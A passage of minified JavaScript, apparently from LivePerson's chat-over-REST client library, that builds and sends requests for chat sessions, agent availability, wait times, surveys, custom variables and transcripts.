        }]);
        aa.publish({
          eventName: qa.onInit,
          data: {
            account: a.lpNumber,
            domain: a.domain,
            init: !0
          }
        });
        Y(W(da.chatStates.INITIALISED));
      }
      a.requestChat ? da.requestChat(a) : ga.runSuccessCallback(a, {});
      b = null;
    };
    b.error = function (c) {
      var d = [qa.onInit];
      a.requestChat && d.push(qa.onRequestChat);
      D(a, b, c, d, "unable to initiate session");
      ca.clearData();
    };
    v(na.INFO, {
      originalRequest: a,
      sentRequest: b,
      response: "SENDING REQUEST"
    });
    return ia.issueCall(b);
  }
  function H(a) {
    var b,
      c,
      d,
      e = {};
    a = a || {};
    d = o(a.visitorSessionId);
    c = p(a.visitorId);
    b = da.getRtSessionId();
    e = ga.validateAndExtendConfigs([{
      obj: a,
      type: sa.STR,
      path: oa.agent,
      prop: oa.agent
    }, {
      obj: a,
      type: sa.STR,
      path: oa.skill,
      prop: oa.skill
    }, {
      obj: a,
      type: sa.STR,
      path: oa.sQueue,
      prop: oa.sQueue
    }], e, !0);
    ga.validateAndExtendConfigs([{
      obj: a,
      type: sa.NUM,
      path: "interactionTimeout",
      prop: "interactionTimeout"
    }, {
      obj: navigator,
      type: sa.STR,
      path: oa.UA,
      prop: oa.UA
    }, {
      obj: a,
      type: sa.STR,
      path: oa.leVid,
      prop: oa.leVid
    }, {
      obj: a,
      type: sa.STR,
      path: oa.leSid,
      prop: oa.leSid
    }, {
      obj: a,
      path: oa.leCid,
      prop: oa.leCid
    }, {
      obj: a,
      type: sa.STR,
      path: "ssoKey",
      prop: "ssoKey"
    }, {
      obj: a,
      type: sa.OBJ,
      path: "survey",
      prop: "survey"
    }, {
      obj: a,
      path: "participantId",
      prop: "participantId"
    }, {
      obj: a,
      path: "conversationId",
      prop: "conversationId"
    }, {
      obj: a,
      path: "a2aSourceSiteId",
      prop: "a2aSourceSiteId"
    }, {
      obj: a,
      path: "a2aSourceSessionId",
      prop: "a2aSourceSessionId"
    }, {
      obj: a,
      path: "a2aEventId",
      prop: "a2aEventId"
    }, {
      obj: a,
      type: sa.BOOL,
      path: "runWithRules",
      prop: "runWithRules"
    }, {
      obj: a,
      type: sa.STR,
      path: "ssoServiceExtraParams",
      prop: "ssoServiceExtraParams"
    }, {
      obj: a,
      type: sa.STR,
      path: "ssoServiceKey",
      prop: "ssoServiceKey"
    }, {
      obj: a,
      path: "engagementId",
      prop: "engagementId"
    }, {
      obj: a,
      path: "campaignId",
      prop: "campaignId"
    }, {
      obj: a,
      path: "language",
      prop: "language"
    }, {
      obj: a,
      type: sa.STR,
      path: "capChallenge",
      prop: "capChallenge"
    }, {
      obj: a,
      type: sa.STR,
      path: "capResponse",
      prop: "capResponse"
    }, {
      obj: a,
      type: sa.STR,
      path: oa.captchaV2Response,
      prop: oa.captchaV2Response
    }, {
      obj: a,
      type: sa.NUM,
      path: oa.availabilityPolicy,
      prop: oa.availabilityPolicy
    }, {
      obj: a,
      type: sa.NUM,
      path: oa.queuePriority,
      prop: oa.queuePriority
    }, {
      obj: c,
      prop: oa.vId
    }, {
      obj: d,
      prop: "visitorSessionId"
    }, {
      obj: b,
      prop: "rtSessionId"
    }], e);
    !isNaN(a.maxWaitTime) && a.maxWaitTime >= 0 && a.maxWaitTime < 86400 && (e.maxWaitTime = a.maxWaitTime);
    typeof a.buttonName === sa.STR ? e.chatReferrer = "(button dynamic-button:" + a.buttonName + "()) " + document.location.href : !0 === a.invitation ? e.chatReferrer = "(engage) " + document.location.href : (a.chatReferrer || document.referrer) && (e.chatReferrer = a.chatReferrer || document.referrer);
    if (typeof a.customVariables === sa.OBJ) if (a.customVariables.customVariable && a.customVariables.customVariable.constructor === Array) e.customVariables = a.customVariables;else {
      var f = I(a.customVariables);
      f && (e.customVariables = f);
    }
    a.preChatLines && a.preChatLines.constructor === Array && (e.preChatLines = {
      line: a.preChatLines
    });
    return ga.hasProperties(e) ? {
      request: e
    } : {};
  }
  function I(a) {
    var b = [];
    for (var c in a) a.hasOwnProperty(c) && b.push({
      name: c,
      value: a[c]
    });
    return b.length > 0 ? {
      customVariable: b
    } : null;
  }
  function J(a, b, c) {
    for (var d = ca.getURI(a, b), e = {
        link: []
      }, f = 0; f < c.length; f++) e.link.push({
      href: d + "/" + c[f].href,
      rel: "" + c[f].rel
    });
    ca.addRels(e, b);
  }
  function K(a, b) {
    if (ra.chatInProgress || Ba) return !1;
    var c = {},
      d = n(a.siteContainer);
    d && (c.siteContainer = d);
    var e = ca.buildRequestObj({
      rel: "chat-request",
      type: "chat",
      needAuth: !0,
      requestType: "POST",
      data: H(a),
      queryParams: c
    });
    if (!e) return u({
      error: "requestChat - unable to find rel for request"
    }, "", "", "");
    L(a.sessionUID);
    Ba = !0;
    e = U(e);
    e.success = function (c) {
      var d;
      v(na.INFO, {
        originalRequest: a || "",
        sentRequest: e,
        response: c
      });
      d = c && c.headers && (c.headers.Location || c.headers.location);
      if (d) {
        ca.addRels({
          link: [{
            "@rel": "location",
            "@href": d
          }]
        }, {
          type: "chat"
        });
        ba.storeChatLocationURI(d, b);
        b && (ra.initialised = !1);
        M(a);
      }
      e = null;
    };
    e.error = function (b) {
      D(a, e, b, [qa.onRequestChat], "requestChat  - server error");
      Ba = !1;
    };
    v(na.INFO, {
      originalRequest: a || "",
      sentRequest: e,
      response: "SENDING REQUEST"
    });
    return ia.issueCall(e);
  }
  function L(b) {
    if (b) {
      a = a || {};
      a.sessionUID && da.clearSessionData(a.sessionUID);
      a.sessionUID = b;
    }
  }
  function M(a, b) {
    var c = ca.buildRequestObj({
      rel: "location",
      type: "chat",
      needAuth: !0,
      requestType: "GET"
    });
    if (!c) return u({
      error: "_getSessionData - unable to find rel for request"
    }, "", "", "");
    Ba = !0;
    c = U(c);
    c.success = function (d) {
      v(na.INFO, {
        originalRequest: a || "",
        sentRequest: c,
        response: d
      });
      N(c, a, d);
      b && (ra.initialised = !1);
      ya = 0;
      Ba = !1;
      c = null;
    };
    c.error = function (d) {
      var e = d && d.responseCode,
        f = ga.getErrorData(d, "_getSessionData  - server error", a);
      if (503 === e && 27 === f.error.internalCode && xa > ya) {
        setTimeout(function () {
          M(a, b);
        }, wa);
        ya += 1;
      } else {
        if (ra.chatState === da.chatStates.RESUMING) {
          Y(W(da.chatStates.NOTFOUND));
          ba.sessionEnded();
        }
        D(a, c, d, qa.onRequestChat, "_getSessionData  - server error");
        ya = 0;
        Ba = !1;
      }
    };
    v(na.INFO, {
      originalRequest: "",
      sentRequest: c,
      response: "SENDING REQUEST"
    });
    aa.publish({
      eventName: pa.onSessionData,
      data: c,
      cloneEventData: !0
    });
    return ia.issueCall(c);
  }
  function N(a, b, c) {
    if (c) {
      ca.addRels({
        link: c.body.chat.link
      }, {
        type: "chat"
      });
      ca.addRels(c.body.chat.info, {
        type: "visitor"
      });
      var d = ga.getResponseData(c, "chat", !1);
      aa.publish({
        eventName: qa.onRequestChat,
        data: d
      });
      X(d.info);
      d.events = Q(d.events, d.info);
      var e = Z(d.events);
      e && R(e, d.events);
      ga.runSuccessCallback(b, d);
      Ea = !1;
    }
  }
  function O(a) {
    for (var b = {}, c = 0; c < a.length; c++) b[a[c].skill] = a[c].isAvailable;
    return b;
  }
  function P(a) {
    var b = ca.buildRequestObj({
      rel: "next",
      type: "chat",
      needAuth: !0,
      requestType: "GET"
    });
    if (!b) return u({
      error: "_getEvents - unable to find rel for request"
    }, "", "", "");
    b = U(b);
    b.timeout = 1e4;
    b.retries = 0;
    b.success = function (c) {
      za = 0;
      $ && clearTimeout($);
      var d, e;
      v(na.INFO, {
        originalRequest: "",
        sentRequest: b,
        response: c
      });
      if (c) {
        ca.addRels({
          link: c.body.chat.link
        }, {
          type: "chat"
        });
        ca.addRels(c.body.chat.info, {
          type: "visitor"
        });
        d = ga.getResponseData(c, "chat");
        d.events = Q(d.events, d.info);
        e = Z(d.events);
        e && R(e, d.events);
        d.info && X(d.info);
      }
      ga.runSuccessCallback(a, e);
      b = null;
    };
    b.error = function (c) {
      var d = c && c.responseCode;
      za += 1;
      c = D(a, b, c, [], "");
      !$ && Aa && ($ = setTimeout(function () {
        Y(W(da.chatStates.NOTFOUND));
      }, Aa));
      503 === d && 27 === c.error.internalCode && va > za ? D(a, b, c, [qa.onEvents], "_getEvents - server error") : !$ && za > va || c && c.error && 12 === c.error.internalCode ? Y(W(da.chatStates.NOTFOUND)) : E([qa.onLine, qa.onAgentTyping, qa.onInfo, qa.onEvents], c);
    };
    v(na.INFO, {
      originalRequest: "",
      sentRequest: b,
      response: "SENDING REQUEST"
    });
    return ia.issueCall(b);
  }
  function Q(a, b) {
    var c = a && a.event;
    c = c && c.constructor === Array ? c : [c];
    if (c && b && b.agentPictureUrl) for (var d = 0; d < c.length; d++) c[d] && c[d].by && c[d].by === b.agentName && (c[d].agentPictureUrl = b.agentPictureUrl);
    return a;
  }
  function R(a, b) {
    b && aa.publish({
      eventName: qa.onEventList,
      data: b.event
    });
    a.line && a.line.forEach(function (a) {
      a.textType === oa.RichContent ? aa.publish({
        eventName: qa.onRichContent,
        data: {
          lines: [a]
        }
      }) : aa.publish({
        eventName: qa.onLine,
        data: {
          lines: [a]
        }
      });
    });
    a[oa.LineStatus] && aa.publish({
      eventName: qa.onLineStatus,
      data: {
        status: a[oa.LineStatus]
      }
    });
    if (a["a2a-transfer"]) {
      var c = V(a["a2a-transfer"]);
      aa.publish({
        eventName: qa.onAccountToAccountTransfer,
        data: c
      });
    }
    a.leCollaboration && aa.publish({
      eventName: qa.onCollaboration,
      data: {
        collaboration: a.leCollaboration
      }
    });
    if (a.state) {
      a.state = a.state.constructor === Array ? a.state.pop() : a.state;
      Y(W(a.state.state, a.state.time));
    }
    aa.publish({
      eventName: qa.onEvents,
      data: a
    });
  }
  function S(a) {
    var b = !1;
    a = a.constructor === Array ? a : [a];
    for (var c = {}, d = 0; d < a.length; d++) if ("object" == typeof a[d] && a[d]["@name"]) {
      c[a[d]["@name"]] = a[d].$;
      b = !0;
    }
    return b ? c : a;
  }
  function T(a) {
    if (a) {
      var b = {
        "@type": "leCollaboration",
        subType: a.subType,
        command: a.command
      };
      if ("object" == typeof a.info) {
        var c = [];
        for (var d in a.info) a.info.hasOwnProperty(d) && c.push({
          "@name": d,
          $: a.info[d]
        });
        c.length > 0 && (b.info = c);
      }
      return b;
    }
  }
  function U(a) {
    a.headers = a.headers || {};
    a.headers.Pragma = "no-cache";
    a.headers["Cache-Control"] = "private, max-age=0, no-cache, no-store";
    return a;
  }
  function V(a) {
    return a.length > 1 ? a[a.length - 1] : a[0];
  }
  function W(a, b) {
    return {
      state: a,
      time: b || new Date().toTimeString()
    };
  }
  function X(a) {
    if ("typing" === a.agentTyping != ra.agentTyping) {
      ra.agentTyping = "typing" === a.agentTyping;
      aa.publish({
        eventName: qa.onAgentTyping,
        data: {
          agentTyping: ra.agentTyping
        }
      });
      a.agentTyping = null;
      delete a.agentTyping;
    }
    var b = !1;
    for (var c in a) if (a.hasOwnProperty(c) && ra.hasOwnProperty(c) && a[c] != ra[c] && "lastUpdate" !== c && "agentTyping" !== c && "visitorTyping" !== c && "state" !== c) {
      ra[c] = a[c];
      b = !0;
    }
    ra.state == da.chatStates.RESUMEPAUSEDCHAT && a.state !== ra.state && Y(W(a.state));
    ra.lastUpdate = a.lastUpdate;
    b && aa.publish({
      eventName: qa.onInfo,
      data: ra,
      cloneEventData: !0
    });
  }
  function Y(a) {
    if (ra.chatState !== a.state) {
      ra.chatState = a.state;
      switch (a.state) {
        case da.chatStates.ENDED:
          aa.publish({
            eventName: qa.onStop,
            data: a
          });
          break;
        case da.chatStates.CHATTING:
          aa.publish({
            eventName: qa.onStart,
            data: a
          });
      }
      aa.publish({
        eventName: qa.onState,
        data: a
      });
    }
  }
  function Z(a) {
    if (!a.event) return null;
    a = a.event;
    a = a.constructor === Array ? a : [a];
    for (var b = {}, c = !1, d = 0; d < a.length; d++) {
      var e = a[d].type || a[d]["@type"];
      "leCollaboration" === e && a[d].info && (a[d].info = S(a[d].info));
      if (a[d].channelID) {
        var f = a[d].channelID;
        b[e] = b[e] || {};
        b[e][f] = b[e][f] || [];
        b[e][f].push(a[d]);
      } else {
        b[e] = b[e] || [];
        b[e].push(a[d]);
      }
      c = !0;
    }
    return c ? b : null;
  }
  if (this === window) return !1;
  var $,
    _,
    aa,
    ba,
    ca,
    da = this,
    ea = "ChatOverRestAPI",
    fa = "2.0.2",
    ga = lpTag.utils,
    ha = lpTag && lpTag.taglets && lpTag.taglets.jsonp,
    ia = lpTag && lpTag.taglets && lpTag.taglets.lpAjax,
    ja = a.batchelor ? ["websocket2http", "postmessage", "rest2jsonp"] : ["postmessage", "rest2jsonp"],
    ka = {
      resumeMode: "lpVisitorResumeMode",
      sessionVars: "lpVisitorSessionVars",
      chat: "lpVisitorChatRels",
      sessionUID: "lpSessionUID"
    },
    la = {
      QA: "QA",
      DEV: "DEV",
      PRODUCTION: "PRODUCTION",
      CI: "CI",
      CLOUD: "CLOUD"
    },
    ma = la.PRODUCTION,
    na = {
      ERROR: "ERROR",
      INFO: "INFO",
      DEBUG: "DEBUG"
    },
    oa = {
      skill: "skill",
      sQueue: "serviceQueue",
      agent: "agent",
      mWaitTime: "maxWaitTime",
      sAPIId: "surveyApiId",
      subject: "subject",
      sName: "surveyName",
      vProfile: "visitorProfile",
      sId: "sessionId",
      vId: "visitorId",
      vIp: "visitorIp",
      eId: "engagementId",
      cId: "contextId",
      leVid: "LETagVisitorId",
      leSid: "LETagSessionId",
      leCid: "LETagContextId",
      windowSurveyEnabled: "windowSurveyEnabled",
      engSkillId: "engSkillId",
      availabilityPolicy: "availabilityPolicy",
      queuePriority: "queuePriority",
      UA: "userAgent",
      RichContent: "rich-content",
      LineStatus: "line-status",
      authChatConnId: "authChatConnId",
      ssoKey: "ssoKey",
      redirectUri: "redirectUri",
      zoneOffset: "timezoneOffset",
      captchaV2Response: "gRecapResponse"
    },
    pa = {
      onSessionData: "onSessionData"
    },
    qa = {
      onLoad: "onLoad",
      onInit: "onInit",
      onStart: "onStart",
      onRequestChat: "onRequestChat",
      onAuthentication: "onAuthentication",
      onAuthenticationFail: "onAuthenticationFail",
      onAvailability: "onAvailability",
      onEstimatedWaitTime: "onEstimatedWaitTime",
      onAgentTyping: "onAgentTyping",
      onLine: "onLine",
      onLineStatus: "onLineStatus",
      onRichContent: "onRichContent",
      onInfo: "onInfo",
      onEvents: "onEvents",
      onEventList: "onEventList",
      onState: "onState",
      onStop: "onStop",
      onAccountToAccountTransfer: "onAccountToAccountTransfer",
      onAddLine: "onAddLine",
      onAddLineStatus: "onAddLineStatus",
      onCollaboration: "onCollaboration",
      onSendCollaboration: "onSendCollaboration",
      onVisitorName: "onVisitorName",
      onSetVisitorTyping: "onSetVisitorTyping",
      onAvailableSlots: "onAvailableSlots",
      onTranscript: "onTranscript",
      onPreChatSurvey: "onPreChatSurvey",
      onOfflineSurvey: "onOfflineSurvey",
      onSubmitOfflineSurvey: "onSubmitOfflineSurvey",
      onExitSurvey: "onExitSurvey",
      onLog: "onLog",
      onVisitorDisposed: "onVisitorDisposed",
      onSetCustomVariable: "onSetCustomVariable",
      onSubmitExitSurvey: "onSubmitExitSurvey"
    },
    ra = {
      typing: null,
      visitorName: "",
      agentName: "",
      rtSessionId: "",
      initialised: !1,
      agentTyping: !1,
      chatInProgress: !1,
      visitorId: "",
      agentId: "",
      agentPictureUrl: "",
      skillName: "",
      timeout: "",
      chatSessionKey: "",
      chatState: "",
      exitSurveyOn: !1
    },
    sa = {
      STR: "string",
      BOOL: "boolean",
      ARR: "array",
      OBJ: "object",
      NUM: "number"
    },
    ta = {},
    ua = {},
    va = a && a.failureTolerance || 45,
    wa = a && a.moveToPrimaryInterval || 2e3,
    xa = a && a.moveToPrimaryRetry || 15,
    ya = 0,
    za = 0,
    Aa = a && a.reconnectTimeout,
    Ba = !1,
    Ca = !1,
    Da = !1,
    Ea = !1,
    Fa = 0,
    Ga = !1,
    Ha = {
      timeout: 3e4,
      retries: 3
    };
  da.addLineStatusEvent = function (a) {
    if (!(a && a.refSequenceId && a.status && da.lineStatuses[a.status])) return u({
      error: "No status and refSequenceId to send"
    }, a, "", "");
    var b = ca.buildRequestObj({
      rel: "events",
      type: "chat",
      needAuth: !0,
      requestType: "POST",
      data: {
        event: {
          "@type": "line-status",
          lineStatus: a.status,
          refSequenceId: a.refSequenceId,
          metadata: a.metadata || []
        }
      }
    });
    if (!b || !ra.chatInProgress) return u({
      error: "line status - unable to find rel for request, or chat not active"
    }, a, "", "");
    b = U(b);
    b.success = function (c) {
      v(na.INFO, {
        originalRequest: a,
        sentRequest: b,
        response: c
      });
      if (c) {
        var d = {
          lineStatus: a.status,
          refSequenceId: a.refSequenceId
        };
        aa.publish({
          eventName: qa.onAddLineStatus,
          data: d
        });
        ga.runSuccessCallback(a, d);
      }
      b = null;
    };
    b.error = function (c) {
      D(a, b, c, [qa.onState], "addLineStatusEvent - server error");
    };
    v(na.INFO, {
      originalRequest: a,
      sentRequest: b,
      response: "SENDING REQUEST"
    });
    return ia.issueCall(b);
  };
  da.getSiteDomain = function (a) {
    var b = "https://api.liveperson.net/csdr/account/",
      c = "/service/adminArea/baseURI.lpCsds?version=1.0";
    if ("function" != typeof a.success || !a.site) return u({
      error: "missing callback or site - cannot lookup domain"
    }, "", "", "");
    var d = {
      url: b + a.site + c
    };
    d = U(d);
    d.success = function (b) {
      var c;
      v(na.INFO, {
        originalRequest: {
          site: a.site
        },
        sentRequest: d,
        response: b
      });
      if (b && b.ResultSet && b.ResultSet.lpData) for (var e = b.ResultSet.lpData, f = 0; f < e.length; f++) !c && e[f].lpServer && (c = e[f].lpServer);
      d = null;
      c ? ga.runSuccessCallback(a, {
        domain: c,
        site: a.site
      }) : ga.runErrorCallback(a, {
        error: "unable to resolve site domain",
        response: b,
        site: a.site
      });
    };
    d.error = d.success;
    v(na.INFO, {
      originalRequest: {
        site: a.site
      },
      sentRequest: d,
      response: "SENDING REQUEST"
    });
    return ha.issueCall(d);
  };
  da.authenticate = function (a) {
    var b = c(a);
    if (0 === b.length) d(a);else {
      var e = "There where missing properties in the authentication request: " + b.join(",");
      aa.publish({
        eventName: qa.onAuthenticationFail,
        data: {
          error: e
        }
      });
    }
  };
  da.requestChat = function (b) {
    if (ra.initialised) K(b);else {
      b = b || {};
      b.requestChat = !0;
      b.lpNumber = a.lpNumber;
      b.appKey = a.appKey;
      b.domain = a.domain || null;
      b.clearDomain = !0;
      G(b);
    }
  };
  da.startChat = da.requestChat;
  da.reInit = function (b) {
    ra = {
      typing: null,
      visitorName: "",
      agentName: "",
      rtSessionId: "",
      initialised: !1,
      agentTyping: !1,
      chatInProgress: !1,
      visitorId: "",
      agentId: "",
      agentPictureUrl: "",
      skillName: "",
      timeout: "",
      chatSessionKey: "",
      chatState: "",
      exitSurveyOn: !1
    };
    if (b) {
      !0 === b.disposeVisitor && da.disposeVisitor();
      if (b.sessionUID) {
        a = a || {};
        a.sessionUID = b.sessionUID;
      }
    }
    ca.clearData();
    q();
  };
  da.getAvailableSlots = function (a) {
    var b = {};
    a && (a.agent && typeof a.agent === sa.STR ? b.agent = a.agent : b = ga.validateAndExtendConfigs([{
      obj: a,
      type: sa.STR,
      path: oa.skill,
      prop: oa.skill
    }, {
      obj: a,
      path: oa.mWaitTime,
      prop: oa.mWaitTime
    }], b));
    var c = ca.buildRequestObj({
      rel: "chat-available-slots",
      type: "chat",
      needAuth: !0,
      requestType: "GET",
      queryParams: b
    });
    if (!c) return u({
      error: "getAvailableSlots - unable to find rel for request"
    }, "", "", "");
    c = U(c);
    c.success = function (b) {
      v(na.INFO, {
        originalRequest: a || "",
        sentRequest: c,
        response: b
      });
      if (b) {
        var d = ga.getResponseData(b, "availableSlots", !0);
        aa.publish({
          eventName: qa.onAvailableSlots,
          data: d
        });
        ga.runSuccessCallback(a, d);
      }
      c = null;
    };
    c.error = function (b) {
      D(a, c, b, qa.onAvailableSlots, "getAvailableSlots - server error");
    };
    v(na.INFO, {
      originalRequest: a || "",
      sentRequest: c,
      response: "SENDING REQUEST"
    });
    return ia.issueCall(c);
  };
  da.getEstimatedWaitTime = function (a) {
    var b = {};
    a && (b = ga.validateAndExtendConfigs([{
      obj: a,
      type: sa.STR,
      path: oa.skill,
      prop: oa.skill
    }, {
      obj: a,
      type: sa.STR,
      path: oa.sQueue,
      prop: oa.sQueue
    }], b));
    var c = ca.buildRequestObj({
      rel: "chat-estimatedWaitTime",
      type: "chat",
      needAuth: !0,
      requestType: "GET",
      queryParams: b
    });
    if (!c) return u({
      error: "getEstimatedWaitTime - unable to find rel for request"
    }, "", "", "");
    c = U(c);
    c.success = function (b) {
      v(na.INFO, {
        originalRequest: "",
        sentRequest: c,
        response: b
      });
      if (b) {
        var d = ga.getResponseData(b, "estimatedWaitTime", !0);
        aa.publish({
          eventName: qa.onEstimatedWaitTime,
          data: d
        });
        ga.runSuccessCallback(a, d);
      }
      c = null;
    };
    c.error = function (b) {
      D(a, c, b, qa.onEstimatedWaitTime, "getEstimatedWaitTime - server error");
    };
    v(na.INFO, {
      originalRequest: "",
      sentRequest: c,
      response: "SENDING REQUEST"
    });
    return ia.issueCall(c);
  };
  da.getAvailabilty = function (a) {
    var b = {};
    a && (a.agent && typeof a.agent === sa.STR ? b.agent = a.agent : b = ga.validateAndExtendConfigs([{
      obj: a,
      path: oa.skill,
      prop: oa.skill
    }, {
      obj: a,
      path: oa.mWaitTime,
      prop: oa.mWaitTime
    }, {
      obj: a,
      type: sa.STR,
      path: oa.sQueue,
      prop: oa.sQueue
    }], b));
    var c = ca.buildRequestObj({
      rel: "chat-availability",
      type: "chat",
      needAuth: !0,
      requestType: "GET",
      queryParams: b
    });
    if (!c) return u({
      error: "getAvailability - unable to find rel for request"
    }, "", "", "");
    c = U(c);
    c.success = function (b) {
      var d, e;
      v(na.INFO, {
        originalRequest: a || "",
        sentRequest: c,
        response: b
      });
      if (b) {
        d = ga.getResponseData(b, "availability", !0);
        e = ga.getPropertyFromObject(d, "availability.AvailabilityForSkills.skillAvailability");
        e && (d = O(e));
        aa.publish({
          eventName: qa.onAvailability,
          data: d
        });
        ga.runSuccessCallback(a, d);
      }
      c = null;
    };
    c.error = function (b) {
      D(a, c, b, qa.onAvailability, "getAvailabilty - server error");
    };
    v(na.INFO, {
      originalRequest: a || "",
      sentRequest: c,
      response: "SENDING REQUEST"
    });
    return ia.issueCall(c);
  };
  da.getAvailability = da.getAvailabilty;
  da.disposeVisitor = function () {
    ba.sessionEnded();
    aa.publish({
      eventName: qa.onVisitorDisposed,
      data: {
        visitorDisposed: !0,
        aSync: !0
      }
    });
  };
  da.clearSessionData = function (a) {
    if (a) {
      _.removeSessionData(t(a));
      return !0;
    }
    return !1;
  };
  da.getPreChatSurvey = function (a) {
    var b = {};
    if (a) {
      b = ga.validateAndExtendConfigs([{
        obj: a,
        type: sa.STR,
        path: oa.vProfile,
        prop: oa.vProfile
      }], b, !0);
      b = ga.validateAndExtend({
        obj: a,
        type: sa.STR,
        path: oa.vIp,
        prop: oa.vIp
      }, b);
      b = ga.validateAndExtendConfigs([{
        obj: a,
        path: oa.sAPIId,
        prop: oa.sAPIId
      }, {
        obj: a,
        type: sa.STR,
        path: oa.sName,
        prop: oa.sName
      }], b, !0);
      b = g(b, a);
    }
    var c = ca.buildRequestObj({
      rel: "prechat-survey",
      type: "chat",
      needAuth: !0,
      requestType: "GET",
      queryParams: b
    });
    if (!c) return u({
      error: "getPreChatSurvey - unable to find rel for request"
    }, "", "", "");
    c = U(c);
    c.success = function (b) {
      v(na.INFO, {
        originalRequest: a || "",
        sentRequest: c,
        response: b
      });
      if (b) {
        var d = ga.getResponseData(b, "survey", !0);
        aa.publish({
          eventName: qa.onPreChatSurvey,
          data: d
        });
        ga.runSuccessCallback(a, d);
      }
      c = null;
    };
    c.error = function (b) {
      D(a, c, b, qa.onPreChatSurvey, "getPreChatSurvey - server error");
    };
    v(na.INFO, {
      originalRequest: a || "",
      sentRequest: c,
      response: "SENDING REQUEST"
    });
    return ia.issueCall(c);
  };
  da.getOfflineSurvey = function (a) {
    var b = {};
    if (a) {
      b = ga.validateAndExtendConfigs([{
        obj: a,
        path: oa.sAPIId,
        prop: oa.sAPIId
      }, {
        obj: a,
        type: sa.STR,
        path: oa.vProfile,
        prop: oa.vProfile
      }, {
        obj: a,
        type: sa.STR,
        path: oa.vId,
        prop: oa.vId
      }, {
        obj: a,
        type: sa.STR,
        path: oa.sName,
        prop: oa.sName
      }], b, !0);
      b = ga.validateAndExtendConfigs([{
        obj: a,
        path: oa.engSkillId,
        prop: oa.engSkillId
      }, {
        obj: a,
        type: sa.BOOL,
        path: oa.windowSurveyEnabled,
        prop: oa.windowSurveyEnabled
      }], b);
      b = g(b, a);
    }
    var c = ca.buildRequestObj({
      rel: "chat-offline-survey",
      type: "chat",
      needAuth: !0,
      requestType: "GET",
      queryParams: b
    });
    if (!c) return u({
      error: "getOfflineSurvey - unable to find rel for request"
    }, "", "", "");
    c = U(c);
    c.success = function (b) {
      v(na.INFO, {
        originalRequest: a || "",
        sentRequest: c,
        response: b
      });
      if (b) {
        var d = ga.getResponseData(b, "survey", !0);
        aa.publish({
          eventName: qa.onOfflineSurvey,
          data: d
        });
        ga.runSuccessCallback(a, d);
      }
      c = null;
    };
    c.error = function (b) {
      D(a, c, b, qa.onOfflineSurvey, "getOfflineSurvey - server error");
    };
    v(na.INFO, {
      originalRequest: a || "",
      sentRequest: c,
      response: "SENDING REQUEST"
    });
    return ia.issueCall(c);
  };
  da.submitOfflineSurvey = function (a) {
    var b,
      c,
      d = {};
    if (!a.survey) return u({
      error: "Survey must be present in order to submit"
    }, "", "", "");
    d.survey = a.survey;
    var e = {},
      f = n(a.siteContainer);
    f && (e.siteContainer = f);
    b = o(a.visitorSessionId);
    c = p(a.visitorId);
    d.survey = lpTag.utils.validateAndExtendConfigs([{
      obj: b,
      prop: "visitorSessionId"
    }, {
      obj: c,
      prop: oa.vId
    }, {
      obj: a,
      type: sa.STR,
      path: oa.leVid,
      prop: oa.leVid
    }, {
      obj: a,
      type: sa.STR,
      path: oa.leSid,
      prop: oa.leSid
    }, {
      obj: a,
      path: oa.leCid,
      prop: oa.leCid
    }, {
      obj: a,
      path: "offsiteEngContext",
      prop: "offsiteEngContext"
    }, {
      obj: a,
      type: sa.STR,
      path: "chatRefferer",
      prop: "chatRefferer"
    }, {
      obj: a,
      type: sa.STR,
      path: oa.skill,
      prop: oa.skill
    }, {
      obj: a,
      type: sa.STR,
      path: "capChallenge",
      prop: "capChallenge"
    }, {
      obj: a,
      type: sa.STR,
      path: "capResponse",
      prop: "capResponse"
    }, {
      obj: a,
      type: sa.STR,
      path: oa.captchaV2Response,
      prop: oa.captchaV2Response
    }, {
      obj: a,
      path: oa.vIp,
      prop: oa.vIp
    }, {
      obj: navigator,
      path: oa.UA,
      prop: oa.UA
    }], d.survey);
    var g = ca.buildRequestObj({
      rel: "chat-offline-survey",
      type: "chat",
      needAuth: !0,
      requestType: "PUT",
      data: d,
      queryParams: e
    });
    if (!g) return u({
      error: "submitOfflineSurvey - unable to find rel for request"
    }, "", "", "");
    g = U(g);
    g.success = function (b) {
      v(na.INFO, {
        originalRequest: a || "",
        sentRequest: g,
        response: b
      });
      if (b) {
        var c = ga.getResponseData(b);
        aa.publish({
          eventName: qa.onSubmitOfflineSurvey,
          data: c
        });
        ga.runSuccessCallback(a, c);
      }
      g = null;
    };
    g.error = function (b) {
      D(a, g, b, qa.onSubmitOfflineSurvey, "submitOfflineSurvey - server error");
    };
    v(na.INFO, {
      originalRequest: a || "",
      sentRequest: g,
      response: "SENDING REQUEST"
    });
    return ia.issueCall(g);
  };
  da.pauseChat = function () {
    Ga = !0;
    Y(W(da.chatStates.PAUSECHAT));
    ba.changeKeepAliveState();
  };
  da.resumePausedChat = function () {
    Ga = !1;
    Y(W(da.chatStates.RESUMEPAUSEDCHAT));
    ba.changeKeepAliveState();
  };
  da.setCustomVariable = function (a) {
    if (!a.customVariable) return u({
      error: "setCustomVariable - no variables passed in"
    }, "", "", "");
    var b = I(a.customVariable);
    if (!b || !b.customVariable) return u({
      error: "setCustomVariable - unable to find any custom variables to set"
    }, "", "", "");
    a.customVariable = b.customVariable;
    var c = ca.buildRequestObj({
      rel: "custom-variables",
      type: "chat",
      needAuth: !0,
      requestType: "PUT",
      data: {
        customVariables: {
          customVariable: a.customVariable
        }
      }
    });
    if (!c) return u({
      error: "setCustomVariable - unable to find rel for request"
    }, "", "", "");
    c = U(c);
    c.success = function (b) {
      v(na.INFO, {
        originalRequest: a || "",
        sentRequest: c,
        response: b
      });
      if (b) {
        var d = {
          customVariable: a.customVariable
        };
        aa.publish({
          eventName: qa.onSetCustomVariable,
          data: d
        });
        ga.runSuccessCallback(a, d);
      }
      c = null;
    };
    c.error = function (b) {
      D(a, c, b, qa.onSetCustomVariable, "setCustomVariable  - server error");
    };
    v(na.INFO, {
      originalRequest: a || "",
      sentRequest: c,
      response: "SENDING REQUEST"
    });
    return ia.issueCall(c);
  };
  da.requestTranscript = function (a) {
    var b,
      c = new RegExp(/[a-zA-Z0-9.-_]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$/i);
    b = typeof a === sa.STR ? a : a.email;
    var d = {
      transcriptRequest: {
        email: b
      }
    };
    a[oa.zoneOffset] && (d.transcriptRequest[oa.zoneOffset] = a[oa.zoneOffset]);
    a[oa.subject] && (d.transcriptRequest[oa.subject] = a[oa.subject]);
    if (typeof b !== sa.STR || !c.test(a.email)) return u({
      error: "requestTranscriptEmail - no variables passed in or invalid email"
    }, "", "", "");
    var e = ca.buildRequestObj({
      rel: "transcript-with-subject-request",
      type: "chat",
